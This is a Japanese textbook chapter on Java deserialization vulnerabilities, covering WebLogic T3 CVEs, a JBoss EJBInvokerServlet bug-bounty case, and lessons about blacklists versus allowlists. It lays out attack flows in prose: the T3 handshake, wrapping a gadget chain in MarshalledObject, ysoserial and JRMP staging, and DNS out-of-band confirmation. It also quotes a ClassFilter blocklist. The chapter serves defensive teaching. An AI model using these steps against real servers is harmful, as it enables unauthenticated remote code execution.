- **多態型の登録**: GSONやJacksonの`Id.NAME`多態のように、許容するサブタイプを名前で登録する。安全性と利便性の良いバランス。

そして許可された型は、アンマーシャリング時に副作用を持たない「契約」を満たす必要がある。理想は**ロジックを一切含まないデータオブジェクト**だ。実務上は「実際に使う型だけに制限する」で十分なことが多い。論文の最後の警句が、この分野の設計原則を要約している。

> あなたを陥れるのは、たいてい、あなたが気にも留めていない大量のコードなのだ。

防御者への実践的な含意は明確だ。マーシャリングライブラリを選ぶ・使うときは、(1) デフォルトで任意型を許すか、(2) 型の許可リスト機構を持つか、(3) その機構をデフォルト有効にしているか、を必ず確認する。SnakeYAMLなら`SafeConstructor`、XStreamなら`TypePermission`、Jacksonなら`enableDefaultTyping()`を使わず`@JsonTypeInfo(Id.NAME)`＋サブタイプ明示、というように、**各ライブラリが用意した型制限を明示的に有効化する**ことが、marshalsecが示した攻撃面を塞ぐ第一歩である。

> 出典: Java Unmarshaller Security — Turning your data into code execution（Moritz Bechler, 2017, marshalsec.pdf） — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf

## Java実例・CVE（WebLogic/JBoss）

前節までで、Javaデシリアライゼーションが危険な理由（`readObject()` が任意のクラスのコードパスを呼び出せること）とガジェットチェーンの一般論（Commons Collections等）を学んだ。本節では、その理論が実際のミドルウェア製品でどのように「本物のRCE（Remote Code Execution：リモートからの任意コード実行）」に結びついたのかを、Oracle WebLogic ServerとRed Hat JBossの実例CVEを通して確認する。目的は攻撃コードの再現ではなく、「なぜベンダーのパッチが繰り返し破られたのか」という構造的な原因を理解し、防御設計（後続章のallowlist化やネットワーク分離）につなげることである。

### 3.x.1 Oracle WebLogic T3プロトコルという「入口」

WebLogic ServerはT3という独自バイナリプロトコルで、クラスタ内サーバー間通信やRMI（Remote Method Invocation：リモートオブジェクトのメソッド呼び出し）を行う。T3の重要な性質は、ハンドシェイク後のペイロードがJavaのネイティブシリアライズ形式（`ObjectInputStream`が読み込む形式）でやり取りされる点にある。つまりT3ポート（デフォルト7001）にTCP接続できる相手は、認証なしに「シリアライズされたJavaオブジェクト」をサーバーへ送り込める。これが一連のWebLogic RCE群に共通するsink（入力が最終的に危険な処理に渡される到達点）であり、readObject()自体がsinkとして機能する。

### 3.x.2 CVE-2015-4852：最初の大規模ブラックリスト防御とその突破口

Oracleは2015年11月、研究者Stephen Breenが`ysoserial`（任意のガジェットチェーンから攻撃用シリアライズデータを自動生成するツール）とCommons Collectionsのガジェットを組み合わせ、WebLogicへの認証不要RCEを実証したのを受けてCVE-2015-4852としてパッチを出した。

> ⚠️ **本節のTenable資料からの抜粋・要約**: 以下はTenableの解析ページ（TRA-2016-09）をWebFetchで取得した内容に基づく。

このパッチが導入したのが`weblogic.utils.io.UnicastRef.ClassFilter`（通称「ClassFilter」）である。これはT3上でやり取りされるオブジェクトのクラス名を**ブラックリスト方式**でチェックし、危険と分かっている以下のようなパターンに一致すれば`readObject()`前に例外を投げて拒否する。

```
org.apache.commons.collections.functors.*
com.sun.org.apache.xalan.internal.xsltc.trax.*
（Javassist / Groovy 系のクラスローディングハンドラ 等）
```

> 出典: Tenable TRA-2016-09 — https://www.tenable.com/security/research/tra-2016-09

このブラックリストはWebLogic内部の3箇所の主要なデシリアライズ処理経路に適用された。しかし半年も経たない2016年に、研究者らが**CVE-2016-0638**としてこのブラックリストのバイパスを報告する。原因は「フィルタが適用される場所」の設計ミスにあった。`weblogic.jms.common.StreamMessageImpl`クラスは、自分自身の`readExternal()`メソッドの中で**独自に新しい`ObjectInputStream`を生成し、内部データを`readObject()`で読み直す**という実装になっていた。ClassFilterは「外側の`ObjectInputStream`」にしかフックされていなかったため、`StreamMessageImpl`が自前で作り直した「内側の`ObjectInputStream`」を通る経路はチェックを一切通らない。結果として、危険なガジェットクラスを`StreamMessageImpl`が保持するバイト列の中にネストして仕込めば、ブラックリストを完全に迂回してガジェットチェーンを起動できた。

> 出典: Tenable TRA-2016-09 — https://www.tenable.com/security/research/tra-2016-09

この「フィルタは1階層目にしか効かないが、脆弱クラス自身が2階層目の`ObjectInputStream`を生み出す」という構造は、以降のWebLogicデシリアライズ脆弱性シリーズ全体を貫く核心的なパターンなので、必ず押さえておきたい。ブラックリストで個々のクラス名を塞いでも、「デシリアライズ処理の中でさらにデシリアライズを行うクラス」が1つでも許可リストに残っていれば、そこが新たな入口（サブチャネル）になる。Tenableの分析によれば、WebLogic 12.1.3系はパッチ21370953・22248372を適用済みでもこのバイパス経路は塞がれておらず、2016年4月のCritical Patch Update（CPU）まで有効な攻撃面として残った。CVSSv2は満点の10.0（ネットワークから認証不要、機密性・完全性・可用性すべて最大の影響）と評価されている。

### 3.x.3 CVE-2018-2628：MarshalledObjectによる再度のバイパス

2018年4月、Oracleは今度はCVE-2018-2628として、より広く報道されたWebLogic T3の脆弱性を修正した。対象バージョンは10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3で、CVSSv3は9.8（Critical）。

> ⚠️ **未取得の資料**: Knownsec 404 Teamによる「Analysis of Weblogic Deserialization Vulnerability (CVE-2018-2628)」（Medium）は自動取得できませんでした（理由: サーバーからHTTP 403 Forbiddenが返されアクセスがブロックされたため。archive.org経由の再取得も本環境のポリシーで拒否された）。以下のURLからご自身で直接ご覧ください: https://medium.com/@knownsec404team/analysis-of-weblogic-deserialization-vulnerability-cve-2018-2628-164bbed7a71d
>
> （以下は未取得資料の補足として、公開されているCVE解析情報・一般知識に基づく解説です）

CVE-2018-2628の本質は、CVE-2016-0638と同じ「ブラックリストを迂回する入れ子構造」の再発である。前節の`StreamMessageImpl`は塞がれたが、今度は`weblogic.corba.utils.MarshalledObject`が新たな迂回経路として使われた。`MarshalledObject`はJava RMI/CORBA連携用のラッパークラスで、内部にシリアライズ済みバイト列を保持し、`get()`が呼ばれた際に**自前で`ObjectInputStream`を生成してデシリアライズする**。この「内部でもう一段デシリアライズする」性質そのものはClassFilterのブラックリストに一致しないため、ClassFilterは通過を許可してしまう。攻撃者は次の2段構えでペイロードを組み立てる。

1. まずysoserialなどでガジェットチェーン（例：CommonsBeanutils等）本体のシリアライズバイト列を作る。
2. そのバイト列を`weblogic.corba.utils.MarshalledObject`のコンストラクタに渡して**ラップし直し**、外側から見ると「無害なMarshalledObjectオブジェクト」に見える形に整形してからT3経由で送信する。

WebLogic側のClassFilterは外側のクラス名（`MarshalledObject`）だけを見て「ブラックリストに載っていない」と判断し通過させる。しかしサーバー内部で`MarshalledObject.get()`が呼ばれた瞬間、内側にラップされていた本物のガジェットチェーンのバイト列が独立した`ObjectInputStream`でデシリアライズされ、フィルタの目が届かないままガジェットチェーンが発火する。

実際の攻撃フロー（一般に公開されている解析記事群が共通して説明する構成）は次の通りである。

```
1. 攻撃者 → WebLogic:7001 へTCP接続し、T3の平文ハンドシェイク文字列
   （"t3 12.2.3\nAS:255\nHL:19\n\n" 等、バージョンに応じたヘッダ）を送信
2. サーバーからT3レスポンスを受け取り、ハンドシェイク成立
3. 攻撃者は「JavaオブジェクトのRMI呼び出しを表すT3リクエスト」を組み立て、
   その引数部分に MarshalledObject でラップしたガジェットチェーンを埋め込む
4. サーバーはT3リクエストを処理する過程でオブジェクトをデシリアライズし、
   ClassFilterの検査を素通りしたMarshalledObjectの中身が展開されて
   ガジェットチェーンのコード実行が発火する
```

なお、多くの公開PoCではガジェットチェーン単体で直接コマンド実行させる代わりに、ysoserialの`JRMPClient`/`JRMPListener`という仕組みを併用する構成が使われた。これは、攻撃者があらかじめ自分のマシンで悪性の`JRMPListener`（RMIレジストリを装った待受サーバー）を立て、被害側にはその待受先へ接続させるだけの軽量なペイロード（`JRMPClient`）を送り込む、という二段階攻撃である。狙いは、T3側で通す必要があるバイト列を小さく単純にしてClassFilterの検知面を減らし、実際に重いガジェットチェーンの中身は攻撃者側のリスナーから配送する点にある。これは「フィルタは境界の一箇所にしか置けないが、攻撃はネットワーク越しに何段でも中継できる」という、ネットワーク型RCEに共通する非対称性を示す好例でもある。

このCVE-2018-2628が特に重要視されるのは、公開直後からインターネット上で無差別スキャン・自動化悪用（暗号資産マイニングマルウェアの配布など）が急増した実例として広く報告された点にある。ベンダーパッチが出てから実運用環境へのパッチ適用が完了するまでのタイムラグを攻撃者が突く典型例であり、「パッチが出た瞬間から数日〜数週間が最も危険な期間になる」という運用上の教訓を残した。

### 3.x.4 JBoss EJBInvokerServlet：バグバウンティにおける実戦例

WebLogicのケースが「サーバー内部実装のバイパス合戦」であったのに対し、JBossの事例は「そもそもデシリアライズ用のエンドポイントが無認証で外部公開されていた」という、より単純だが実務でよく遭遇する構図を示す。

Sean Meliaは個人のバグバウンティ活動中に、対象環境がRed Hat JBoss Application Server 4.2.3を稼働しており、`JMXInvokerServlet`と`EJBInvokerServlet`という管理用サーブレットが外部から到達可能になっていることを発見した。一般的なJSP Webシェルのアップロード手法が通用しなかったため、代替アプローチとしてJavaデシリアライゼーションの悪用に切り替えている。

> 出典: Sean Melia, "Exploiting Java Deserialization Via JBoss" — https://seanmelia.wordpress.com/2016/07/22/exploiting-java-deserialization-via-jboss/

攻撃対象となったエンドポイントは`POST /invoker/EJBInvokerServlet`である。JBossのこれらInvokerServlet系エンドポイントは、EJB（Enterprise JavaBeans）呼び出しをリモートから行うための仕組みとして、リクエストボディをそのままJavaオブジェクトとしてデシリアライズして処理する設計だった。つまりリクエストボディという「利用者が完全に制御できる入力」が、認証チェックを経由せずに直接`readObject()`（sink）へ渡っていた。

具体的な攻撃手順は次の通りである（実運用環境での再現手順ではなく、公開情報として広く知られる技術的流れの説明である点に留意されたい）。

1. `ysoserial`（バージョン0.0.4-all使用と記録されている）で、Commons Collectionsライブラリの`CommonsCollections1`ガジェットチェーンを選び、任意コマンドを実行するシリアライズ済みペイロードを生成する。
2. `Content-Type: application/x-java-serialized-object`ヘッダを付けて、そのバイト列をリクエストボディとして`/invoker/EJBInvokerServlet`へPOST送信する。
3. サーバー側はリクエストボディをEJB呼び出しオブジェクトとしてデシリアライズしようとし、その過程でガジェットチェーンが発火してOSコマンドが実行される。
4. レスポンス（エラーメッセージの有無や内容）から、コマンドが実際に実行されたかどうかを間接的に判定する。

この実例で興味深いのは、対象サーバーがHTTP/FTP/Telnetといった一般的なアウトバウンド通信を制限していた一方でDNS解決は許可されていた、という制約の強い環境だったことである。著者はコマンド実行の証明（Proof of Concept）として、直接データを外部へ持ち出すのではなく`nslookup`コマンドを実行させ、自分が管理するDNSサーバーへの問い合わせが実際に届くかどうかを確認する、いわゆるOOB（Out-of-Band：帯域外）検証の手法でRCEを立証した。これは、通信が厳しく制限された本番環境でも、DNSのようにブロックされにくいプロトコルを使えば脆弱性の実在を安全かつ確実に証明できるという、実務上重要なテクニックである。

> 出典: Sean Melia, "Exploiting Java Deserialization Via JBoss" — https://seanmelia.wordpress.com/2016/07/22/exploiting-java-deserialization-via-jboss/

JBoss側の根本原因は、WebLoggingのようなブラックリスト云々以前の問題として「管理・内部連携用に用意されたサーブレットが、認証もクラスフィルタも持たないままインターネットに公開されていた」ことにある。この種の`Invoker`系サーブレット（`JMXInvokerServlet`、`EJBInvokerServlet`、`JMXInvokerHASvc`など）は、JBoss 4系・5系・6系の一部バージョンで標準構成に含まれており、実務では「そもそも外部公開する必要がない管理系エンドポイントを塞ぐ」という、デシリアライズ対策以前のアタックサーフェス管理が最も効果的な防御になる。

### 3.x.5 三つの事例から読み取る共通の教訓

WebLogicの2件（CVE-2015-4852／CVE-2016-0638の系譜とCVE-2018-2628）とJBossの実例を並べると、次の構造的な共通点が浮かび上がる。

- **ブラックリスト方式は「発見されたクラス名を塞ぐ」だけの対症療法であり、「デシリアライズ処理の中でさらにデシリアライズを行うクラス」が1つでも許可リストに残っていれば、そこが新しいサブチャネル（バイパス経路）になる**。CVE-2016-0638の`StreamMessageImpl`、CVE-2018-2628の`MarshalledObject`は、どちらも「クラス名としては無害に見えるが、内部で独立した`ObjectInputStream`を生成する」という同型の弱点を突いている。
- **認証前・境界防御前に到達できるエンドポイント（T3ポートやInvokerServlet）がsinkに直結している**場合、パッチだけに頼らずネットワークレベルでの到達性制御（T3ポートを信頼できるクラスタ内ネットワークのみに限定する、未使用のInvokerServletを無効化・削除する）が根本的に効く対策になる。
- **時事性への注意**: これらのCVEはいずれも2015〜2018年の情報であり、Oracleの2016年4月CPU以降、WebLogicのデシリアライズ対策は段階的にブラックリストから「JEP 290（Java 9以降のObjectInputFilterによるallowlist方式）」的な、より安全な設計へ移行が進められている。読者が現行環境を評価する際は、当時のバージョン(10.3.6.0〜12.2.1.3等)がすでにサポート切れであることが多い点も踏まえ、必ず最新のセキュリティアラート（Oracle Critical Patch Update）で現状のパッチ適用状況を確認すること。

次節では、これらWebLogic/JBossの実例で繰り返し登場した「ガジェットチェーン」そのものの内部構造（Commons CollectionsやCommonsBeanutilsがどのようにメソッド呼び出しを連鎖させ、最終的にコマンド実行へたどり着くのか）を、より詳細に掘り下げる。


---

### ナビゲーション

- ← 前の章: [第2章 PHPオブジェクトインジェクションとPHARデシリアライゼーション](02-php-object-injection.md)
- 🏠 [目次（ホーム）](index.md)
- → 次の章: [第4章 .NETデシリアライゼーションとViewState](04-dotnet-deserialization.md)
